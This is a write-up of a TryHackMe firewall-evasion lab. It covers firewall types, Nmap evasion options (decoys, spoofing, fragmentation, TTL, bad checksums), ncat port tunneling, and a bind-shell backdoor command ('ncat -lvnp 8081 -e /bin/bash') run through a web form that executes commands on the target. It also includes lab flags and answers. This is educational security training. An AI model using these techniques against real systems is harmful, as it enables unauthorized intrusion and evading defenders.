
# Introduction

---

AÂ firewallÂ is software or hardware that monitors the network traffic and compares it against a set of rules before passing or blocking it. One simple analogy is a guard or gatekeeper at the entrance of an event. This gatekeeper can check the ID of individuals against a set of rules before letting them enter (or leave).

Before we go into more details about firewalls, it is helpful to remember the contents of an IP packet andÂ TCPÂ segment. The following figure shows the fields we expect to find in an IP header. If the figure below looks complicated, you donâ€™t need to worry as we are only interested in a few fields. Different types of firewalls are capable of inspecting various packet fields; however, the most basicÂ firewallÂ should be able to inspect at least the following fields:

- Protocol
- Source Address
- Destination Address

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/09d8061f603e6ba8e65a185dc4a2d417.png)  

Depending on the protocol field, the data in the IP datagram can be one of many options. Three common protocols are:

- TCP
- UDP
- ICMP

In the case ofÂ TCPÂ orÂ UDP, theÂ firewallÂ should at least be able to check theÂ TCPÂ andÂ UDPÂ headers for:

- Source Port Number
- Destination Port Number

TheÂ TCPÂ header is shown in the figure below. We notice that there are many fields that theÂ firewallÂ might or might not be able to analyze; however, even the most limited of firewalls should give theÂ firewallÂ administrator control over allowed or blocked source and destination port numbers.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/756fac51ff45cbc4af49336b15a30928.png)

  

### Learning Objectives

This room covers:

1. The different types of firewalls, according to different classification criteria
2. Various techniques to evade firewalls

This room requires the user to have basic knowledge of:

- ISO/OSI layers andÂ TCP/IP layers. We suggest going through theÂ [Network Fundamentals](https://tryhackme.com/module/network-fundamentals)Â module if you want to refresh your knowledge.
- Network and port scanning. We suggest you complete theÂ [Nmap](https://tryhackme.com/module/nmap)Â module to learn more about this topic.
- Reverse and bind shells. We recommend theÂ [What the Shell?](https://tryhackme.com/room/introtoshells)Â room to learn more about shells.

### Warmup Questions

The design logic of traditional firewalls is that a port number would identify the service and the protocol. In traditional firewalls, i.e., packet-filtering firewalls, everything is allowed and blocked mainly based on the following:

- Protocol, such asÂ TCP,Â UDP, and ICMP
- IP source address
- IP destination address
- SourceÂ TCPÂ orÂ UDPÂ port number
- DestinationÂ TCPÂ orÂ UDPÂ port number

Letâ€™s consider this very simplified example. If you want to blockÂ HTTPÂ traffic, you need to block theÂ TCPÂ traffic from sourceÂ TCPÂ port 80, i.e., the port number used byÂ HTTPÂ by default. If you want to allow HTTPS traffic, you should allow the traffic from sourceÂ TCPÂ port number 443, i.e., the port number used by HTTPS. Obviously, this is not efficient because there are other default port numbers that we need to include. Furthermore, the service can be running on a non-default port number. Someone can run anÂ HTTPÂ server on port 53 or 6667.

VisitÂ [Service Name and Transport Protocol Port Number Registry](http://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml)Â to learn more about the default port number and to answer the following questions.

![Pasted image 20250523141533.png](../../../IMAGES/Pasted%20image%2020250523141533.png)

# Types of Firewalls

---

There are multiple ways to classify firewalls. One way to classify firewalls would be whether they are independent appliances.

1. HardwareÂ FirewallÂ (applianceÂ firewall): As the name implies, an applianceÂ firewallÂ is a separate piece of hardware that the network traffic has to go through. Examples include Cisco ASA (Adaptive Security Appliance), WatchGuard Firebox, and Netgate pfSense Plus appliance.
2. SoftwareÂ firewall: This is a piece of software that comes bundled with theÂ OS, or you can install it as an additional service. MS Windows has a built-inÂ firewall, Windows DefenderÂ Firewall, that runs along with the otherÂ OSÂ services and user applications. Another example isÂ LinuxÂ iptables and firewalld.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b496d0fb1bec2be05d7202e2ddbf1663.png)  

  

We can also classify firewalls into:

1. PersonalÂ firewall: A personalÂ firewallÂ is designed to protect a single system or a small network, for example, a small number of devices and systems at a home network. Most likely, you are using a personalÂ firewallÂ at home without paying much attention to it. For instance, many wireless access points designed for homes have a built-inÂ firewall. One example is Bitdefender BOX. Another example is theÂ firewallÂ that comes as part of many wireless access points and home routers from Linksys and Dlink.
2. CommercialÂ firewall: A commercialÂ firewallÂ protects medium-to-large networks. Consequently, you would expect higher reliability and processing power, in addition to supporting a higher network bandwidth. Most likely, you are going through such aÂ firewallÂ when accessing the Internet from within your university or company.

From the red team perspective, the most crucial classification would be based on theÂ firewallÂ inspection abilities. It is worth thinking about theÂ firewallÂ abilities in terms of the ISO/OSI layers shown in the figure below. Before we classify firewalls based on their abilities, it is worthy of remembering that firewalls focus on layers 3 and 4 and, to a lesser extent, layer 2. Next-generation firewalls are also designed to cover layers 5, 6, and 7. The more layers aÂ firewallÂ can inspect, the more sophisticated it gets and the more processing power it needs.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ad200ff1a857631d88940d3e3637736b.png)  

Based onÂ firewallÂ abilities, we can list the followingÂ firewallÂ types:

- Packet-FilteringÂ Firewall: Packet-filtering is the most basic type ofÂ firewall. This type ofÂ firewallÂ inspects the protocol, source and destination IP addresses, and source and destination ports in the case ofÂ TCPÂ andÂ UDPÂ datagrams. It is a stateless inspectionÂ firewall.
- Circuit-Level Gateway: In addition to the features offered by the packet-filtering firewalls, circuit-level gateways can provide additional capabilities, such as checkingÂ TCPÂ three-way-handshake against theÂ firewallÂ rules.
- Stateful InspectionÂ Firewall: Compared to the previous types, this type ofÂ firewallÂ gives an additional layer of protection as it keeps track of the establishedÂ TCPÂ sessions. As a result, it can detect and block anyÂ TCPÂ packet outside an establishedÂ TCPÂ session.
- ProxyÂ Firewall: AÂ proxyÂ firewallÂ is also referred to as ApplicationÂ FirewallÂ (AF) and Web ApplicationÂ FirewallÂ (WAF). It is designed to masquerade as the original client and requests on its behalf. This process allows theÂ proxyÂ firewallÂ to inspect the contents of the packet payload instead of being limited to the packet headers. Generally speaking, this is used for web applications and does not work for all protocols.
- Next-GenerationÂ FirewallÂ (NGFW): NGFW offers the highestÂ firewallÂ protection. It can practically monitor all network layers, from OSI Layer 2 to OSI Layer 7.Â It has application awareness and control.Â Examples include the Juniper SRX series and Cisco Firepower.
- CloudÂ FirewallÂ orÂ FirewallÂ as a Service (FWaaS): FWaaS replaces a hardwareÂ firewallÂ in a cloud environment. Its features might be comparable to NGFW, depending on the service provider; however, it benefits from the scalability of cloud architecture. One example is Cloudflare MagicÂ Firewall, which is a network-levelÂ firewall. Another example is Juniper vSRX; it has the same features as an NGFW but is deployed in the cloud.Â It is also worth mentioningÂ AWSÂ WAF for web application protection andÂ AWSÂ Shield forÂ DDoSÂ protection.


![Pasted image 20250523141855.png](../../../IMAGES/Pasted%20image%2020250523141855.png)

# Evasion via Controlling the Source MAC/IP/Port

---

When scanning a host behind aÂ firewall, theÂ firewallÂ will usually detect and block port scans. This situation would require you to adapt your network and port scan to evade theÂ firewall. A network scanner likeÂ NmapÂ provides few features to help with such a task. In this room, we groupÂ NmapÂ techniques into three groups:

1. Evasion via controlling the source MAC/IP/Port
2. Evasion via fragmentation,Â MTU, and data length
3. Evasion through modifying header fields

NmapÂ allows you to hide or spoof the source as you can use:

1. Decoy(s)
2. Proxy
3. Spoofed MAC Address
4. Spoofed Source IP Address
5. Fixed Source Port Number

Before we elaborate on each approach, letâ€™s show what aÂ NmapÂ stealth (SYN) scan looks like. We are scanning an MS Windows target (with default built-inÂ firewall), so we addedÂ `-Pn`Â to force the scan to proceed even if no ping reply is received.Â `-Pn`Â is used to skip host discovery and testing whether the host is live. Moreover, to speed up the scan, we limited ourselves to the 100 most common ports using theÂ `-F`Â option. The scan was performed using the following commandÂ `nmap -sS -Pn -F MACHINE_IP`.

The following screenshot shows Wiresharkâ€™s capture of theÂ NmapÂ probe packets. Wireshark was running on the same system runningÂ Nmap.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/169fd944d79366e156fcb6c30ff8018e.png)  

We can dive into all the details embedded into each packet; however, for this exercise, we would like to note the following:

- Our IP addressÂ `10.14.17.226`Â has generated and sent around 200 packets. TheÂ `-F`Â option limits the scan to the top 100 common ports; moreover, each port is sent a second SYN packet if it does not reply to the first one.
- The source port number is chosen at random. In the screenshot, you can see it is 37710.
- The total length of the IP packet is 44 bytes. There are 20 bytes for the IP header, which leaves 24 bytes for theÂ TCPÂ header. No data is sent viaÂ TCP.
- The Time to Live (TTL) is 42.
- No errors are introduced in the checksum.

In the following sections and tasks, we will see howÂ NmapÂ provides various options to evade theÂ firewallÂ and other network security solutions.

![Pasted image 20250523142029.png](../../../IMAGES/Pasted%20image%2020250523142029.png)

### Decoy(s)

Hide your scan with decoys. Using decoys makes your IP address mix with other â€œdecoyâ€ IP addresses. Consequently, it will be difficult for the firewall and target host to know where the port scan is coming from. Moreover, this can exhaust the blue team investigating each source IP address.

Using theÂ `-D`Â option, you can add decoy source IP addresses to confuse the target. Consider the following command,Â `nmap -sS -Pn -D 10.10.10.1,10.10.10.2,ME -F MACHINE_IP`. The Wireshark capture is shown in the following figure.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0123f32d7cc90fca50a3d565824955b1.png)  

The targetÂ `MACHINE_IP`Â will also see scans coming fromÂ `10.10.10.1`Â andÂ `10.10.10.2`Â when only one source IP address,Â `ME`, is running the scan.Â Note that if you omit theÂ `ME`Â entry in the scan command, Nmap will put your real IP address, i.e.Â `ME`, in a random position.

You can also set Nmap to use random source IP addresses instead of explicitly specifying them. By runningÂ `nmap -sS -Pn -D RND,RND,ME -F MACHINE_IP`, Nmap will choose two random source IP addresses to use as decoys. Nmap will use new random IP addresses each time you run this command. In the screenshot below, we see how Nmap picked two random IP addresses in addition to our own,Â `10.14.17.226`.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2fb8362a71b22cdbe9e60fd638c1813c.png)

![Pasted image 20250523142139.png](../../../IMAGES/Pasted%20image%2020250523142139.png)

### Proxy

Use an HTTP/SOCKS4 proxy. Relaying the port scan via a proxy helps keep your IP address unknown to the target host. This technique allows you to keep your IP address hidden while the target logs the IP address of the proxy server. You can go this route using the Nmap optionÂ `--proxies PROXY_URL`. For example,Â `nmap -sS -Pn --proxies PROXY_URL -F MACHINE_IP`Â will send all its packets via the proxy server you specify. Note that you can chain proxies using a comma-separated list.

![Pasted image 20250523142211.png](../../../IMAGES/Pasted%20image%2020250523142211.png)

### Spoofed MAC Address

Spoof the source MAC address. Nmap allows you to spoof your MAC address using the optionÂ `--spoof-mac MAC_ADDRESS`. This technique is tricky; spoofing the MAC address works only if your system is on the same network segment as the target host. The target system is going to reply to a spoofed MAC address. If you are not on the same network segment, sharing the same Ethernet, you wonâ€™t be able to capture and read the responses. It allows you to exploit any trust relationship based on MAC addresses. Moreover, you can use this technique to hide your scanning activities on the network. For example, you can make your scans appear as if coming from a network printer.

![Pasted image 20250523142315.png](../../../IMAGES/Pasted%20image%2020250523142315.png)

### Spoofed IP Address

Spoof the source IP address. Nmap lets you spoof your IP address usingÂ `-S IP_ADDRESS`. Spoofing the IP address is useful if your system is on the same subnetwork as the target host; otherwise, you wonâ€™t be able to read the replies sent back. The reason is that the target host will reply to the spoofed IP address, and unless you can capture the responses, you wonâ€™t benefit from this technique. Another use for spoofing your IP address is when you control the system that has that particular IP address. Consequently, if you notice that the target started to block the spoofed IP address, you can switch to a different spoofed IP address that belongs to a system that you also control. This scanning technique can help you maintain stealthy existence; moreover, you can use this technique to exploit trust relationships on the network based on IP addresses.

![Pasted image 20250523142352.png](../../../IMAGES/Pasted%20image%2020250523142352.png)

### Fixed Source Port Number

Use a specific source port number. Scanning from one particular source port number can be helpful if you discover that the firewalls allow incoming packets from particular source port numbers, such as port 53 or 80. Without inspecting the packet contents, packets from source TCP port 80 or 443 look like packets from a web server, while packets from UDP port 53 look like responses to DNS queries. You can set your port number usingÂ `-g`Â orÂ `--source-port`Â options.

The following Wireshark screenshot shows a Nmap scan with the fixed source TCP port number 8080. We have used the following Nmap command,Â `nmap -sS -Pn -g 8080 -F MACHINE_IP`. You can see in the screenshot how it is that all the TCP connections are sent from the same TCP port number.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a0307f9e74e7f110b546dc7b423a288e.png)

![Pasted image 20250523142423.png](../../../IMAGES/Pasted%20image%2020250523142423.png)

This is a quick summary of the Nmap options discussed in this task.

| Evasion Approach                              | Nmap Argument                             |
| --------------------------------------------- | ----------------------------------------- |
| Hide a scan with decoys                       | `-D DECOY1_IP1,DECOY_IP2,ME`              |
| Hide a scan with random decoys                | `-D RND,RND,ME`                           |
| Use an HTTP/SOCKS4 proxy to relay connections | `--proxies PROXY_URL`                     |
| Spoof source MAC address                      | `--spoof-mac MAC_ADDRESS`                 |
| Spoof source IP address                       | `-S IP_ADDRESS`                           |
| Use a specific source port number             | `-g PORT_NUM`Â orÂ `--source-port PORT_NUM` |


# Evasion via Forcing Fragmentation, MTU, and Data Length

---

You can control the packet size as it allows you to:

- Fragment packets, optionally with givenÂ MTU. If theÂ firewall, or theÂ IDS/IPS, does not reassemble the packet, it will most likely let it pass. Consequently, the target system will reassemble and process it.
- Send packets with specific data lengths.

Answer the questions below

### Fragment Your Packets with 8 Bytes of Data

One easy way to fragment your packets would be to use theÂ `-f`Â option. This option will fragment the IP packet to carry only 8 bytes of data. As mentioned earlier, running a Nmap TCP port scan means that the IP packet will hold 24 bytes, the TCP header. If you want to limit the IP data to 8 bytes, the 24 bytes of the TCP header will be divided across 3 IP packets. And this is precisely what we obtained when we ran this Nmap scan,Â `nmap -sS -Pn -f -F MACHINE_IP`. As we can see in the Wireshark capture in the figure below, each IP packet is fragmented into three packets, each with 8 bytes of data.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/4b9961c8f49af3eded45b0b43c03548b.png)

![Pasted image 20250523142529.png](../../../IMAGES/Pasted%20image%2020250523142529.png)

### Fragment Your Packets with 16 Bytes of Data

Another handy option is theÂ `-ff`, limiting the IP data to 16 bytes. (One easy way to remember this is that oneÂ `f`Â is 8 bytes, but twoÂ `f`s are 16 bytes.) By runningÂ `nmap -sS -Pn -ff -F MACHINE_IP`, we expect the 24 bytes of the TCP header to be divided between two IP packets, 16 + 8, becauseÂ `-ff`Â has put an upper limit of 16 bytes. The first few packets are shown in the Wireshark capture below.


![Pasted image 20250523142540.png](../../../IMAGES/Pasted%20image%2020250523142540.png)

![Pasted image 20250523142549.png](../../../IMAGES/Pasted%20image%2020250523142549.png)



### Fragment Your Packets According to a Set MTU

Another neat way to fragment your packets is by setting the MTU. In Nmap,Â `--mtu VALUE`Â specifies the number of bytes per IP packet. In other words, the IP header size is not included. The value set for MTU must always be a multiple of 8.

_Note that the Maximum Transmission Unit (MTU) indicates the maximum packet size that can pass on a certain link-layer connection. For instance, Ethernet has an MTU of 1500, meaning that the largest IP packet that can be sent over an Ethernet (link layer) connection is 1500 bytes. Please donâ€™t confuse this MTU with theÂ `--mtu`Â in Nmap options._

Running Nmap withÂ `--mtu 8`Â will be identical toÂ `-f`Â as the IP data will be limited to 8 bytes. The first few packets generated by this Nmap scanÂ `nmap -sS -Pn --mtu 8 -F MACHINE_IP`Â are shown in the following Wireshark capture.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/7ec48d889b3ba89910d69526ddbe4fd2.png)

![Pasted image 20250523142625.png](../../../IMAGES/Pasted%20image%2020250523142625.png)

### Generate Packets with Specific Length

In some instances, you might find out that the size of the packets is triggering the firewall or the IDS/IPS to detect and block you. If you ever find yourself in such a situation, you can make your port scanning more evasive by setting a specific length. You can set the length of data carried within the IP packet usingÂ `--data-length VALUE`. Again, remember that the length should be a multiple of 8.

If you run the following Nmap scanÂ `nmap -sS -Pn --data-length 64 -F MACHINE_IP`, each TCP segment will be padded with random data till its length is 64 bytes. In the screenshot below, we can see that each TCP segment has a length of 64 bytes.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c71dd8a63e95fac1ad5a2aa68220c780.png)


![Pasted image 20250523142642.png](../../../IMAGES/Pasted%20image%2020250523142642.png)

This is a quick summary of the Nmap options discussed in this task.

| Evasion Approach                | Nmap Argument       |
| ------------------------------- | ------------------- |
| Fragment IP data into 8 bytes   | `-f`                |
| Fragment IP data into 16 bytes  | `-ff`               |
| Fragment packets with given MTU | `--mtu VALUE`       |
| Specify packet length           | `--data-length NUM` |


# Evasion via Modifying Header Fields

---

NmapÂ allows you to control various header fields that might help evade theÂ firewall. You can:

- Set IP time-to-live
- Send packets with specified IP options
- Send packets with a wrongÂ TCP/UDPÂ checksum

### SetÂ TTL

NmapÂ gives you further control over the different fields in the IP header. One of the fields you can control is the Time-to-Live (TTL).Â NmapÂ options includeÂ `--ttl VALUE`Â to set theÂ TTLÂ to a custom value. This option might be useful if you think the defaultÂ TTLÂ exposes your port scan activities.

In the following screenshot, we can see the packets captured by Wireshark after using a customÂ TTLÂ as we run our scan,Â `nmap -sS -Pn --ttl 81 -F MACHINE_IP`. As with the previous examples, the packets below are captured on the same system runningÂ Nmap.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f98efaf6faf449bf6cc2787baa581e31.png)


![Pasted image 20250523143653.png](../../../IMAGES/Pasted%20image%2020250523143653.png)

```
sudo nmap -sS -Pn -ttl 2 -F 10.10.108.209
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-23 19:35 UTC
Nmap scan report for 10.10.108.209
Host is up (0.18s latency).
Not shown: 97 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 4.73 seconds
```

### Set IP Options

One of the IP header fields is the IP Options field. Nmap lets you control the value set in the IP Options field usingÂ `--ip-options HEX_STRING`, where the hex string can specify the bytes you want to use to fill in the IP Options field. Each byte is written asÂ `\xHH`, whereÂ `HH`Â represents two hexadecimal digits, i.e., one byte.

A shortcut provided by Nmap is using the letters to make your requests:

- `R`Â to record-route.
- `T`Â to record-timestamp.
- `U`Â to record-route and record-timestamp.
- `L`Â for loose source routing and needs to be followed by a list of IP addresses separated by space.
- `S`Â for strict source routing and needs to be followed by a list of IP addresses separated by space.

The loose and strict source routing can be helpful if you want to try to make your packets take a particular route to avoid a specific security system.

### Use a Wrong Checksum

Another trick you can use is to send your packets with an intentionally wrong checksum. Some systems would drop a packet with a bad checksum, while others wonâ€™t. You can use this to your advantage to discover more about the systems in your network. All you need to do is add the optionÂ `--badsum`Â to your Nmap command.

UsingÂ `nmap -sS -Pn --badsum -F 10.10.108.209`, we scanned our target using intentionally incorrect TCP checksums. The target dropped all our packets and didnâ€™t respond to any of them.

```shell-session
pentester@TryHackMe# nmap -sS -Pn --badsum -F 10.10.108.209
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-28 16:07 EET
Nmap scan report for 10.10.108.209
Host is up.
All 100 scanned ports on 10.10.108.209 are filtered

Nmap done: 1 IP address (1 host up) scanned in 21.31 seconds
```

The screenshot below shows the packets captured by Wireshark on the system running Nmap. Wireshark can be optionally set to verify the checksums, and we can notice how it highlights the errors.


![Pasted image 20250523143803.png](../../../IMAGES/Pasted%20image%2020250523143803.png)

```
sudo nmap -sS -Pn --badsum -F 10.10.108.209
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-23 19:36 UTC
Nmap scan report for 10.10.108.209
Host is up.
All 100 scanned ports on 10.10.108.209 are in ignored states.
Not shown: 100 filtered tcp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 21.09 seconds
```


This is a quick summary of the Nmap options discussed in this task.

| Evasion Approach                           | Nmap Argument          |
| ------------------------------------------ | ---------------------- |
| Set IP time-to-live field                  | `--ttl VALUE`          |
| Send packets with specified IP options     | `--ip-options OPTIONS` |
| Send packets with a wrong TCP/UDP checksum | `--badsum`             |


# Evasion Using Port Hopping

---

Three commonÂ firewallÂ evasion techniques are:

- Port hopping
- Port tunneling
- Use of non-standard ports

Port hopping is a technique where an application hops from one port to another till it can establish and maintain a connection. In other words, the application might try different ports till it can successfully establish a connection. Some â€œlegitimateâ€ applications use this technique to evade firewalls. In the following figure, the client kept trying different ports to reach the server till it discovered a destination port not blocked by theÂ firewall.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/26fce8aa8569f391ad64a26a147de2d4.png)  

There is another type of port hopping where the application establishes the connection on one port and starts transmitting some data; after a while, it establishes a new connection on (i.e., hopping to) a different port and resumes sending more data. The purpose is to make it more difficult for theÂ blue teamÂ to detect and track all the exchanged traffic.

On the AttackBox, you can use the commandÂ `ncat -lvnp PORT_NUMBER`Â to listen on a certainÂ TCPÂ port.

- `-l`Â listens for incoming connections
- `-v`Â provides verbose details (optional)
- `-n`Â does not resolve hostnames viaÂ DNSÂ (optional)
- `-p`Â specifies the port number to use
- `-lvnp PORT_NUMBER`Â listens on TCP portÂ `PORT_NUMBER`. If the port number is less than 1024, you need to runÂ `ncat`Â as root.

For example, runÂ `ncat -lvnp 1025`Â on the AttackBox to listen onÂ TCPÂ port 1025, as shown in the terminal output below.

Pentester Terminal

```shell-session
pentester@TryHackMe$ ncat -lvnp 1025
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1025
Ncat: Listening on 0.0.0.0:1025
```

We want to test if the target machine can connect to the AttackBox onÂ TCPÂ port 1025. By browsing toÂ `http://10.10.108.209:8080`, you will be faced with a web page that lets you execute commands on the target machine.Â _Note that in a real-case scenario, you might be exploiting a vulnerable service that allows remote code execution (RCE) or a misconfigured system to execute some code of your choice._

In this lab, you can simply run aÂ LinuxÂ command by submitting it on the provided form atÂ `http://10.10.108.209:8080`. We can use Netcat to connect to the target port using the commandÂ `ncat IP_ADDRSS PORT_NUMBER`. For instance, we can runÂ `ncat ATTACKBOX_IP 1024`Â to connect to the AttackBox at TCP port 1024. We want to check if the firewall is configured to allow connections. If the connection from the machine, with IP addressÂ `10.10.108.209`, can pass through theÂ firewall, we will be notified of the successful connection on the AttackBox terminal as shown below.


```shell-session
pentester@TryHackMe$ ncat -lvnp 1025
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1025
Ncat: Listening on 0.0.0.0:1025
Ncat: Connection from 10.10.30.130.
Ncat: Connection from 10.10.30.130:51292.
```

![Pasted image 20250523144159.png](../../../IMAGES/Pasted%20image%2020250523144159.png)


  
# Evasion Using Port Tunneling

---

Port tunneling is also known asÂ _port forwarding_Â andÂ _port mapping_. In simple terms, this technique forwards the packets sent to one destination port to another destination port. For instance, packets sent to port 80 on one system are forwarded to port 8080 on another system.

### Port Tunneling UsingÂ `ncat`

Consider the case where you have a server behind theÂ firewallÂ that you cannot access from the outside. However, you discovered that theÂ firewallÂ does not block specific port(s). You can use this knowledge to your advantage by tunneling the traffic via a different port.

Consider the following case. We have anÂ SMTPÂ server listening on port 25; however, we cannot connect to theÂ SMTPÂ server because theÂ firewallÂ blocks packets from the Internet sent to destination port 25. We discover that packets sent to destination port 443 are not blocked, so we decide to take advantage of this and send our packets to port 443, and after they pass through theÂ firewall, we forward them to port 25. Letâ€™s say that we can run a command of our choice on one of the systems behind theÂ firewall. We can use that system to forward our packets to theÂ SMTPÂ server using the following command.

`ncat -lvnp 443 -c "ncat TARGET_SERVER 25"`

The commandÂ `ncat`Â uses the following options:

- `-lvnp 443`Â listens on TCP port 443. Because the port number is less than 1024, you need to runÂ `ncat`Â as root in this case.
- `-c`Â orÂ `--sh-exec`Â executes the given command viaÂ `/bin/sh`.
- `"ncat TARGET_SERVER 25"`Â will connect to the target server at port 25.

As a result,Â `ncat`Â will listen on port 443, but it will forward all packets to port 25 on the target server. Because in this case, theÂ firewallÂ is blocking port 25 and allowing port 443, port tunneling is an efficient way to evade theÂ firewall.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ef6b903dbb6c4eb20051f9ddd5b9fa8f.png)  


![Pasted image 20250523144541.png](../../../IMAGES/Pasted%20image%2020250523144541.png)

![Pasted image 20250523144546.png](../../../IMAGES/Pasted%20image%2020250523144546.png)

We need to use:

```
ncat -lvnp 8008 -c "ncat MACHINE_IP 80"
```

Once we submit it, we can go to:

```
MACHINE_IP:8008
```

![Pasted image 20250523144658.png](../../../IMAGES/Pasted%20image%2020250523144658.png)

We got our flag:

```
THM{1298331956} 
```



# Evasion Using Non-Standard Ports

---

`ncat -lvnp PORT_NUMBER -e /bin/bash`Â will create a backdoor via the specified port number that lets you interact with the Bash shell.

- `-e`Â orÂ `--exec`Â executes the given command
- `/bin/bash`Â location of the command we want to execute

On the AttackBox, we can runÂ `ncat 10.10.19.194 PORT_NUMBER`Â to connect to the target machine and interact with its shell.

Considering the case that we have aÂ firewall, it is not enough to useÂ `ncat`Â to create a backdoor unless we can connect to the listening port number. Moreover, unless we runÂ `ncat`Â as a privileged user,Â `root`, or usingÂ `sudo`, we cannot use port numbers below 1024.

![Pasted image 20250523144900.png](../../../IMAGES/Pasted%20image%2020250523144900.png)


```
ncat -lvnp 8081 -e /bin/bash
```

![Pasted image 20250523144807.png](../../../IMAGES/Pasted%20image%2020250523144807.png)

```
nc MACHINE_IP 8081
```

![Pasted image 20250523144839.png](../../../IMAGES/Pasted%20image%2020250523144839.png)

We got our answer:

```
thmredteam
```


# Next-Generation **Firewalls**

---

Traditional firewalls, such as packet-filtering firewalls, expect a port number to dictate the protocol being used and identify the application. Consequently, if you want to block an application, you need to block a port. Unfortunately, this is no longer valid as many applications camouflage themselves using ports assigned for other applications. In other words, a port number is no longer enough nor reliable to identify the application being used. Add to this the pervasive use of encryption, for example, via SSL/TLS.

Next-GenerationÂ FirewallÂ (NGFW) is designed to handle the new challenges facing modern enterprises. For instance, some of NGFW capabilities include:

- Integrate aÂ firewallÂ and a real-time Intrusion Prevention System (IPS). It can stop any detected threat in real-time.
- Identify users and their traffic. It can enforce the security policy per-user or per-group basis.
- Identify the applications and protocols regardless of the port number being used.
- Identify the content being transmitted. It can enforce the security policy in case any violating content is detected.
- Ability to decrypt SSL/TLS andÂ SSHÂ traffic. For instance, it restricts evasive techniques built around encryption to transfer malicious files.

A properly configured and deployed NGFW renders many attacks useless.

![Pasted image 20250523144942.png](../../../IMAGES/Pasted%20image%2020250523144942.png)

# Conclusion

---

This room covered the different types of firewalls and the common evasion techniques. Correctly understanding the limitations of theÂ firewallÂ technology you are targeting helps you pick and construct suitableÂ firewallÂ evasion processes. This room demonstrated different evasion techniques usingÂ `ncat`; however, the same results can be achieved using a different tool, such asÂ `socat`. It is recommended to check out theÂ [What the Shell?](https://tryhackme.com/room/introtoshells)Â room.

The following table summarizes theÂ NmapÂ arguments covered in this room.

| Evasion Approach                              | NmapÂ Argument                             |
| --------------------------------------------- | ----------------------------------------- |
| Hide a scan with decoys                       | `-D DECOY1_IP1,DECOY_IP2,ME`              |
| Use anÂ HTTP/SOCKS4Â proxyÂ to relay connections | `--proxies PROXY_URL`                     |
| Spoof source MAC address                      | `--spoof-mac MAC_ADDRESS`                 |
| Spoof source IP address                       | `-S IP_ADDRESS`                           |
| Use a specific source port number             | `-g PORT_NUM`Â orÂ `--source-port PORT_NUM` |
| Fragment IP data into 8 bytes                 | `-f`                                      |
| Fragment IP data into 16 bytes                | `-ff`                                     |
| Fragment packets with givenÂ MTU               | `--mtu VALUE`                             |
| Specify packet length                         | `--data-length NUM`                       |
| Set IP time-to-live field                     | `--ttl VALUE`                             |
| Send packets with specified IP options        | `--ip-options OPTIONS`                    |
| Send packets with a wrongÂ TCP/UDPÂ checksum    | `--badsum`                                |
